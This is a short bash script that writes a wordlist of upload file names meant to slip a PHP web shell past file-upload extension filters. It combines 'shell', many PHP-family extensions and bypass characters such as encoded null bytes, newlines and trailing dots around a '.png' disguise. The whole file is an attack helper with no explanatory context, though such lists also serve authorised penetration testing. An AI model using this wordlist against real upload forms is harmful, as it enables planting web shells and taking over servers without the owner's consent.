#!/bin/bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps' '.php3' '.php7' '.php5' '.php4' '.php8' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm'; do
        echo "shell$char$ext.png" >> wordlist.txt
        echo "shell$ext$char.png" >> wordlist.txt
        echo "shell.png$char$ext" >> wordlist.txt
        echo "shell.png$ext$char" >> wordlist.txt
    done
done
